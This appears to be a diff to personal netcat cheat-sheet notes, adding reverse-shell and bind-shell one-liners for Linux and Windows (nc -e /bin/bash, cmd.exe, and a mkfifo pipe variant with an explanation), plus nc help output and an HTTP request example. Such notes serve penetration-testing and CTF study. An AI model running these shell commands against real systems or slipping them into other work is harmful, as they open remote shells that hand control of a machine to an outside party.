@@ -1,4 +1,39 @@
-#### nc -h
+## Shells
+
+#### Reverse shell - Listener on our machine
+
+listen on our machine:
+`nc -lvnp <port>`
+
+connect with linux target:
+`nc <ip> <port> -e /bin/bash`
+
+if linux target nc does not have `-e`:
+`mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
+*(explanation under bind shell)*
+
+#### Bind shell - listener on target
+
+listen on linux target:
+`nc -lvnp <PORT> -e /bin/bash`
+
+listen on windows target:
+`nc -lvnp <PORT> -e "cmd.exe"`
+
+if linux target nc does not have `-e`:
+`mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
+- `mkfiko` creates a "named pipe", that is a special file that works as an io stream
+- the named pipe output goes to nc
+- the output of nc goes to a new shell
+- both stdout and stderr of the new shell goes to nc
+- the new shell are in other words us on the other computer
+- when finished the names pipe file is deleted
+
+connect with our machine:
+`nc <ip> <port>`
+
+
+### Help
 
 ```sh
 ┌──(kali㉿kali)-[~]
@@ -33,13 +68,14 @@ port numbers can be individual or ranges: lo-hi [inclusive];
 hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
 ```
 
-#### useful commands
 
-listen:
-nc -lvnp 443
+### More
+
+
+
 
 send http request
-nc localhost 80
+`nc localhost 80`
 GET / HTTP/1.1
 (empty line)
 or
